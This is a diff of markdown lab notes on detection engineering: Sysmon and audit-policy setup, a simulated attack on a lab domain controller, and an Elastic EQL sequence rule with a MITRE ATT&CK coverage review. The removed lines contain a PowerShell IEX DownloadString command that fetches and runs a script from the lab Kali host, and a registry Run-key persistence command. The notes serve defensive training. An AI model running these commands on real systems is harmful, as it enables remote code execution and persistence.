@@ -1,233 +1,334 @@
-# Detection Engineering & MITRE Validation — Personal Technical Notes
+# Build Notes
+# Detection Engineering: EQL Sequence Rule and MITRE ATT&CK Validation
 
-Date Completed: May 5, 2026
-Alert Fired: 7:06 PM EDT
+This file provides supporting build context for the main README. It documents the lab sequence, telemetry setup, validation points, evidence interpretation, and screenshot mapping.
 
----
-
-## Phase 0: Telemetry Setup — Exact Commands
-
-### Sysmon Installation (Windows Server 2022 DC)
-
-```
-sysmon64.exe -accepteula -i sysmonconfig-export.xml
-```
-
-Config used: SwiftOnSecurity `sysmonconfig-export.xml`
-This config uses `onmatch=exclude` filtering — it suppresses benign high-volume events (ICMP, internal subnet network connections, system process noise) and retains full fidelity on process creation, file writes, registry modifications, and attack-grade network connections.
-
-### Windows Advanced Audit Policy Configuration
-
-Three settings activated — all on the Domain Controller:
-
-**Setting 1 — Force Audit Policy Subcategory:**
-```
-Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → "Audit: Force audit policy subcategory settings to override audit policy category settings" → Enabled
-```
-
-**Setting 2 — Include Command Line in Process Creation:**
-```
-Computer Configuration → Administrative Templates → System → Audit Process Creation → "Include command line in process creation events" → Enabled
-```
-
-**Setting 3 — Advanced Audit Process Creation:**
-```
-Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Detailed Tracking → "Audit Process Creation" → Success + Failure
-```
-
-### Force Group Policy Sync
-
-```
-gpupdate /force
-```
-
-Required after enabling audit policy changes. Without this, policy changes sit in pending state — Sysmon Event ID 1 logs will show blank `process.command_line` fields until the policy syncs.
-
-### Kali Static IP Assignment (eth1)
-
-```bash
-ip addr add 10.0.0.5/24 dev eth1
-ip link set eth1 up
-```
-
-Verified with:
-```bash
-ip addr show eth1
-```
-
-eth1 static: `10.0.0.5`
-VMNet range: `192.168.9.136`
-DC IP: `192.168.9.142` (Ethernet1 adapter)
-
-### Telemetry Verification Query (Kibana)
-
-```
-winlog.event_id: 1 AND process.command_line: *Phase0*
-```
-
-Verification command executed on DC:
-```
-whoami /priv ; echo "Phase0_CommandLine_Verification_Test"
-```
-
-Confirmed: `process.command_line` populated in Elastic with full arguments. Phase 0 gate passed.
-
-### Event ID 3 — Expected Absence
-
-```
-winlog.event_id: 3 AND source.ip: "192.168.9.136"
-winlog.event_id: 3
-```
-
-Both queries returned zero results after confirmed `nc -zv 192.168.9.142 445` TCP handshake. This is correct. SwiftOnSecurity config excludes internal subnet network connections via `onmatch=exclude`. Not a misconfiguration. Event ID 3 fires on external/attack-grade lateral movement, not internal ping traffic.
+The README explains the full project story. These notes focus on the build details behind the project without repeating the entire write-up.
 
 ---
 
-## Phase 1: Attack Simulation — Exact Commands
+## Purpose of This File
 
-### Stage 1 — Reconnaissance
+This project was built to practice detection engineering in Elastic using Sysmon, Windows audit policy, simulated endpoint activity, and an EQL sequence rule.
 
-```
-whoami
-```
+These build notes focus on:
 
-Executed on the DC. Generates Sysmon Event ID 1 with `process.name: whoami.exe`. This is the first stage trigger for the EQL sequence rule.
-
-### Stage 2 — Payload Staging
-
-File creation activity executed on DC. Generates Sysmon Event ID 11 (File Create). This is the second stage trigger in the EQL sequence rule.
-
-### Stage 3 — PowerShell Download Execution
-
-```powershell
-powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/payload.ps1')
-
-
-```
-
-Generates Sysmon Event ID 1 with full command line arguments captured — including the `DownloadString` URL and `IEX` invocation. High-signal TTP.
-
-### Stage 4 — Registry Persistence
-
-```
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Users\Public\payload.exe" /f
-```
-
-Generates Sysmon Event ID 13 (Registry Value Set). Captures key path, value name, and data.
+- Telemetry setup
+- Audit policy configuration
+- Kali network setup
+- Attack simulation sequence
+- EQL rule logic
+- Alert validation
+- MITRE ATT&CK coverage review
+- Screenshot-supported evidence
 
 ---
 
-## MITRE ATT&CK Framework Validation
+## Lab Environment
 
-### Security Onion Navigator Analysis
-
-Validated detection coverage using Security Onion's MITRE ATT&CK Navigator (Screenshot 17). The heatmap visualizes which techniques have active Sigma and Suricata detection rules deployed.
-
-**Coverage Interpretation:**
-- Blue tiles = techniques with active detection rules deployed
-- Grey/black tiles = detection gaps requiring rule engineering
-
-**Identified Coverage Gaps:**
-- Reconnaissance tactic: minimal coverage (Active Scanning, Gather Victim Host Information)
-- Resource Development tactic: minimal coverage (Acquire Infrastructure, Compromise Accounts)
-- Initial Access tactic: partial coverage gaps
-
-**Strong Coverage Areas:**
-- Discovery (34 techniques covered)
-- Collection (16 techniques covered)
-- Command and Control (18 techniques covered)
-- Exfiltration (9 techniques covered)
-
-This validation confirms the organization's detection posture is strongest in post-exploitation phases (Discovery, Collection, C2) and weakest in pre-intrusion phases (Reconnaissance, Resource Development). Future detection engineering priorities should focus on early-stage adversary activity to push detection left in the kill chain.
-
----
-
-## Troubleshooting Notes — Field Mapping Issues
-
-### Problem: `process.command_line` not populating in Event ID 1 logs
-
-**Root cause:** Windows Advanced Audit Policy change had not been synced via Group Policy. The setting was enabled in the GUI but `gpupdate /force` had not been run. Result: Event ID 1 logs were generating but `process.command_line` was empty — EQL rules targeting command line content returned zero results silently.
-
-**Fix:** `gpupdate /force` on the DC. Verified by rerunning telemetry validation query.
-
-**Lesson:** Policy GUI changes alone are not sufficient. `gpupdate /force` is a hard requirement after any audit policy modification.
-
----
-
-### Problem: `registry.path` field not reliably indexed for EQL
-
-**Root cause:** `registry.path` is a mapped ECS field pulled from Sysmon Event ID 13 data. In this lab's Elastic index configuration, `registry.path` was not indexed with the consistency required for EQL sequence matching. Queries against `registry.path` in EQL returned no matches even when Event ID 13 logs with registry data were confirmed visible in Discover.
-
-**Impact:** Could not use registry persistence as a sequence trigger in the EQL rule. The four-stage attack chain could not be collapsed into a single EQL rule covering all stages.
-
-**Fix:** Redesigned the detection to target the two most cleanly indexed event types — `process` events (Event ID 1) and `file` events (Event ID 11) — which both carry consistent ECS field mappings in this index. `process.command_line` field availability was confirmed pre-rule-build. `registry.path` was deprioritized.
-
-**Lesson:** Always validate field indexing in the target Elastic index before building EQL rules that reference non-standard or ECS-mapped fields. Run a Discover query first to confirm the field is populated and filterable. EQL returns empty results — not errors — when queried fields are unindexed.
-
----
-
-## Why the Two-Stage Approach Worked
-
-### What worked: `process` events + `file` events
-
-- **Sysmon Event ID 1** (Process Create) → maps cleanly to `process.name`, `process.command_line`, `host.name` in ECS
-- **Sysmon Event ID 11** (File Create) → maps cleanly to `file.name`, `file.path`, `host.name` in ECS
-
-Both event types are fully indexed and EQL-compatible in this environment. The sequence rule operating against these two event types executed cleanly against live telemetry.
-
-### What didn't work: `process.command_line` for registry events, `registry.path`
-
-- `registry.path` from Event ID 13 — not consistently indexed in EQL-accessible fields in this index
-- Attempting to build a single multi-step EQL rule spanning process → file → registry returned no results due to field indexing gaps
-
-### The detection logic
-
-```eql
-sequence by host.name with maxspan=1h
-  [process where event.type == "start" and process.name == "whoami.exe"]
-  [file where event.type == "creation"]
-```
-
-`whoami.exe` is one of the first executables run in any hands-on-keyboard intrusion. A file creation event immediately following `whoami.exe` on a domain controller is a high-confidence two-event IOC. This sequence fires before PowerShell, before persistence — it intercepts the earliest confirmable attacker action on the endpoint.
-
----
-
-## EQL Sequence Syntax Breakdown
-
-```eql
-sequence by host.name with maxspan=1h
-  [process where event.type == "start" and process.name == "whoami.exe"]
-  [file where event.type == "creation"]
-```
-
-| Component | Function |
+| Component | Details |
 |---|---|
-| `sequence` | Declares ordered event matching — Stage 1 must occur before Stage 2 |
-| `by host.name` | Correlation key — both events must share the same `host.name` value |
-| `with maxspan=1h` | Time constraint — Stage 2 must occur within 1 hour of Stage 1 |
-| `[process where ...]` | Stage 1 filter — targets process creation events only |
-| `event.type == "start"` | Filters to process start events specifically (excludes stop/end events) |
-| `process.name == "whoami.exe"` | Identifies the specific binary — case-insensitive in EQL |
-| `[file where event.type == "creation"]` | Stage 2 filter — any file creation event on the same host |
+| Hypervisor | VMware Workstation Player 17 |
+| Target Host | Windows Server 2022 Domain Controller |
+| Domain | `cs.local` |
+| DC IP Address | `192.168.9.142` |
+| Kali VMNet IP | `192.168.9.136` |
+| Kali eth1 Static IP | `10.0.0.5` |
+| SIEM | Elastic Security / Kibana |
+| Endpoint Telemetry | Sysmon with SwiftOnSecurity `sysmonconfig-export.xml` |
+| Windows Logging | Advanced Audit Policy and command-line process logging |
+| Detection Language | Elastic EQL |
 
 ---
 
-## host.name Correlation Logic
+## Corrected Lab Sequence
 
-`sequence by host.name` binds both events to the same endpoint. Without this:
+The final lab workflow followed this order:
 
-- A `whoami.exe` execution on any host in the environment (legitimate admin activity, scheduled tasks, monitoring agents) would satisfy Stage 1 of the rule
-- Any subsequent file creation anywhere on any host would satisfy Stage 2
-- Result: high-volume false positives across unrelated endpoints, rule becomes operationally unusable
-
-With `host.name` binding, both events must originate from the same machine. A `whoami.exe` on `WIN-HS48GJMN0GP` must be followed by a file creation on `WIN-HS48GJMN0GP` to fire the alert. Cross-host noise is eliminated at the sequence correlation level.
-
-For production tuning: additional specificity can be added by scoping Stage 2 to specific directories (`file.path` matching staging paths like `C:\Users\Public\`, `C:\Windows\Temp\`) to reduce false positives from routine system file writes following `whoami.exe` execution.
+1. Prepared Sysmon and the SwiftOnSecurity configuration.
+2. Installed Sysmon on the Domain Controller.
+3. Enabled audit policy subcategory enforcement.
+4. Enabled command-line logging for process creation events.
+5. Enabled Advanced Audit Policy for process creation.
+6. Reviewed Kali network interfaces.
+7. Assigned a static IP to Kali `eth1`.
+8. Verified process command-line telemetry in Elastic.
+9. Ran `whoami` on the Domain Controller.
+10. Created `C:\Users\Public\payload.exe`.
+11. Attempted PowerShell remote script retrieval with `DownloadString`.
+12. Added a registry Run key for persistence simulation.
+13. Reviewed attack-related telemetry in Elastic.
+14. Built and enabled the EQL sequence rule.
+15. Re-ran the attack sequence for validation.
+16. Confirmed alert generation in Elastic.
+17. Reviewed MITRE ATT&CK coverage mapping.
 
 ---
 
-## Lessons Learned
+## Important Commands and Artifacts
 
-**Validate field indexing before rule development, not during.** Both `process.command_line` and `registry.path` field issues were discovered mid-build. Pre-build field validation in Discover eliminates this bottleneck. Standard practice going forward: confirm field is populated, filterable, and indexed in Kibana Discover before writing any EQL referencing it.
+| Item | Value |
+|---|---|
+| Sysmon install command | `sysmon64.exe -accepteula -i sysmonconfig-export.xml` |
+| Kali static IP command | `ip addr add 10.0.0.5/24 dev eth1` |
+| Kali interface enable command | `ip link set eth1 up` |
+| Telemetry verification marker | `Phase0_CommandLine_Verification_Test` |
+| Discovery command | `whoami` |
+| Staged file path | `C:\Users\Public\payload.exe` |
+| PowerShell pattern tested | `IEX (New-Object Net.WebClient).DownloadString(...)` |
+| Registry persistence path | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
+| EQL correlation field | `host.name` |
+| EQL maxspan | `1h` |
 
-**`gpupdate /force` is not optional after audit policy changes.** Policy changes applied via GUI are not active until `gpupdate /force` is run.
+---
+
+## Phase 0: Sysmon and Audit Policy Setup
+
+Sysmon was installed with the SwiftOnSecurity configuration file. Windows audit policy settings were also updated to improve process visibility and command-line logging.
+
+The telemetry setup included:
+
+- Sysmon installation
+- Audit policy subcategory enforcement
+- Command-line logging for process creation
+- Advanced Audit Policy process creation auditing
+
+### Screenshot Evidence
+
+| Screenshot | What It Supports |
+|---|---|
+| `screenshots/01_Sysmon_Binary_And_Config_Ready.png` | Sysmon binary and configuration file ready |
+| `screenshots/02_Sysmon_Installation_Complete.png` | Sysmon installed successfully |
+| `screenshots/03_Force_Audit_Policy_Subcategory_Enabled.png` | Audit policy subcategory enforcement enabled |
+| `screenshots/04_Include_Command_Line_In_Process_Creation_Enabled.png` | Command-line logging enabled |
+| `screenshots/05_Advanced_Audit_Process_Creation_Enabled.png` | Advanced Audit Process Creation enabled |
+
+### Observation
+
+This phase mattered because the EQL rule depended on reliable endpoint telemetry. Without Sysmon and process command-line visibility, the later rule development would have been weaker or incomplete.
+
+---
+
+## Phase 1: Kali Network Setup
+
+Kali Linux was configured with a stable lab IP address to keep testing predictable.
+
+The static IP assigned to `eth1` was:
+
+`10.0.0.5/24`
+
+The Kali VMNet IP shown in the lab was:
+
+`192.168.9.136`
+
+### Screenshot Evidence
+
+| Screenshot | What It Supports |
+|---|---|
+| `screenshots/06_Kali_Network_Interfaces_List.png` | Kali network interfaces before static IP assignment |
+| `screenshots/07_Kali_Static_IP_Assigned.png` | Kali `eth1` configured with `10.0.0.5/24` |
+
+### Observation
+
+This helped keep the test environment stable when generating and reviewing activity from the lab machines.
+
+---
+
+## Phase 2: Telemetry Validation
+
+Before building the EQL rule, process command-line telemetry was verified in Elastic.
+
+The validation marker used was:
+
+`Phase0_CommandLine_Verification_Test`
+
+### Screenshot Evidence
+
+| Screenshot | What It Supports |
+|---|---|
+| `screenshots/08_Elastic_Command_Line_Verification_Success.png` | Elastic showing populated `process.command_line` |
+
+### Observation
+
+This was one of the most important gates in the project.
+
+The screenshot confirmed that process command-line data was visible in Elastic. This validated that telemetry was working before detection logic was written.
+
+---
+
+## Phase 3: Attack Simulation
+
+The lab activity was designed to create endpoint telemetry for detection testing.
+
+The simulated sequence included:
+
+1. `whoami` execution
+2. File creation at `C:\Users\Public\payload.exe`
+3. PowerShell remote script retrieval attempt
+4. Registry Run key persistence simulation
+
+### Screenshot Evidence
+
+| Screenshot | What It Supports |
+|---|---|
+| `screenshots/09_Phase1_Whoami_Execution.png` | `whoami` executed as `cs\administrator` |
+| `screenshots/10_Phase1_Attack_Chain_Telemetry.png` | File staging and suspicious DNS lookup attempt |
+| `screenshots/11_Phase1_PowerShell_Execution.png` | PowerShell `DownloadString` attempt with connection failure |
+| `screenshots/12_Phase1_Persistence_Establishment.png` | Registry Run key persistence simulation |
+
+### Observation
+
+The PowerShell download attempt failed because the remote server was unreachable. This still created useful command-line telemetry, but it should not be described as a successful payload download.
+
+The registry Run key was successfully added, but it was not included in the final EQL sequence rule.
+
+---
+
+## Phase 4: Elastic Telemetry Review
+
+Elastic was used to confirm that attack-related activity was visible after the simulation.
+
+### Screenshot Evidence
+
+| Screenshot | What It Supports |
+|---|---|
+| `screenshots/13_Elastic_Attack_Telemetry_Verification.png` | Elastic review of attack-related process telemetry |
+
+### Observation
+
+This confirmed that Elastic contained searchable telemetry from the simulated activity.
+
+The important point was not that every action triggered a detection. The important point was that the telemetry existed and could support rule development and investigation.
+
+---
+
+## Phase 5: EQL Rule Development
+
+The final EQL rule was scoped to a two-stage sequence:
+
+1. `whoami.exe` execution
+2. File creation at `C:\Users\Public\payload.exe`
+
+Both events had to occur on the same host.
+
+```eql
+sequence by host.name with maxspan=1h
+  [process where process.name : "whoami.exe"]
+  [file where file.path : "C:\\Users\\Public\\payload.exe"]
+```
+
+### Screenshot Evidence
+
+| Screenshot | What It Supports |
+|---|---|
+| `screenshots/14_Multi_Stage_Rule_Activation.png` | EQL sequence rule enabled in Elastic |
+
+### Observation
+
+The rule was intentionally narrow and lab-focused.
+
+`whoami.exe` alone can be noisy. File creation alone can also be common. The value of the rule came from correlating both actions on the same host within a time window.
+
+The rule did not include PowerShell, DNS lookup, or registry persistence. Those were supporting telemetry, not part of the final alert logic.
+
+---
+
+## Phase 6: Rule Validation and Alert Generation
+
+After enabling the rule, the attack sequence was re-run to confirm that the EQL rule generated an alert.
+
+### Screenshot Evidence
+
+| Screenshot | What It Supports |
+|---|---|
+| `screenshots/15_Full_Attack_Chain_Reexecution.png` | Attack sequence re-executed for validation |
+| `screenshots/16_EQL_Sequence_Alert_Generation.png` | EQL alert generated successfully |
+
+### Observation
+
+Elastic generated an alert named:
+
+`Multi-Stage Adversary Execution Chain`
+
+This validated that the two-stage EQL sequence rule worked in the lab environment.
+
+---
+
+## Phase 7: MITRE ATT&CK Coverage Review
+
+The Security Onion coverage view was used to review mapped ATT&CK detection coverage.
+
+### Screenshot Evidence
+
+| Screenshot | What It Supports |
+|---|---|
+| `screenshots/17_MITRE_ATT&CK_Detection_Coverage.png` | MITRE ATT&CK coverage overview |
+
+### Observation
+
+This screenshot showed mapped rule coverage across ATT&CK techniques.
+
+It should be interpreted as a coverage overview, not proof that the custom EQL rule covered every highlighted technique.
+
+---
+
+## Evidence Interpretation Notes
+
+These notes keep the project explanation accurate:
+
+- The EQL rule detected a two-stage sequence, not the full four-stage simulation.
+- The PowerShell `DownloadString` command was attempted, but the remote server connection failed.
+- The registry Run key was created, but it was not part of the final EQL rule.
+- The MITRE ATT&CK screenshot shows mapped coverage, not full detection validation for this custom rule.
+- `whoami.exe` alone can be noisy in real environments.
+- The value of the rule came from sequence correlation using `host.name`.
+
+---
+
+## Key Lessons Learned
+
+1. Telemetry validation should happen before detection rule writing.
+2. Command-line visibility makes process telemetry much more useful.
+3. EQL sequence rules are useful for correlating related events over time.
+4. `host.name` prevents unrelated events from different hosts from satisfying the same sequence.
+5. A failed PowerShell download can still produce useful telemetry.
+6. Registry persistence can be reviewed as supporting telemetry even if it is not part of the final rule.
+7. MITRE coverage views are useful for understanding visibility and gaps, but they should not be overstated.
+
+---
+
+## Improvements for a Future Version
+
+Future improvements could include:
+
+- A separate EQL rule for suspicious PowerShell command-line patterns
+- A separate rule for registry Run key persistence
+- More complete Sysmon Event ID references for each event type
+- Testing against benign administrator activity to reduce false positives
+- Testing across multiple hosts
+- More detailed alert screenshots showing event fields
+- A timeline mapping each simulated action to the matching Elastic evidence
+
+---
+
+## Screenshot Map
+
+| Screenshot | What It Supports |
+|---|---|
+| `screenshots/01_Sysmon_Binary_And_Config_Ready.png` | Sysmon binary and configuration file ready |
+| `screenshots/02_Sysmon_Installation_Complete.png` | Sysmon installed successfully |
+| `screenshots/03_Force_Audit_Policy_Subcategory_Enabled.png` | Audit policy subcategory enforcement enabled |
+| `screenshots/04_Include_Command_Line_In_Process_Creation_Enabled.png` | Command-line logging enabled for process creation |
+| `screenshots/05_Advanced_Audit_Process_Creation_Enabled.png` | Advanced Audit Process Creation enabled |
+| `screenshots/06_Kali_Network_Interfaces_List.png` | Kali network interfaces before static IP assignment |
+| `screenshots/07_Kali_Static_IP_Assigned.png` | Kali `eth1` configured with `10.0.0.5/24` |
+| `screenshots/08_Elastic_Command_Line_Verification_Success.png` | Elastic showing populated `process.command_line` |
+| `screenshots/09_Phase1_Whoami_Execution.png` | `whoami` executed as `cs\administrator` |
+| `screenshots/10_Phase1_Attack_Chain_Telemetry.png` | File staging and suspicious DNS lookup attempt |
+| `screenshots/11_Phase1_PowerShell_Execution.png` | PowerShell `DownloadString` attempt with connection failure |
+| `screenshots/12_Phase1_Persistence_Establishment.png` | Registry Run key persistence simulation |
+| `screenshots/13_Elastic_Attack_Telemetry_Verification.png` | Elastic review of attack-related process telemetry |
+| `screenshots/14_Multi_Stage_Rule_Activation.png` | EQL sequence rule enabled in Elastic |
+| `screenshots/15_Full_Attack_Chain_Reexecution.png` | Attack sequence re-executed for validation |
+| `screenshots/16_EQL_Sequence_Alert_Generation.png` | EQL alert generated successfully |
+| `screenshots/17_MITRE_ATT&CK_Detection_Coverage.png` | MITRE ATT&CK coverage overview |
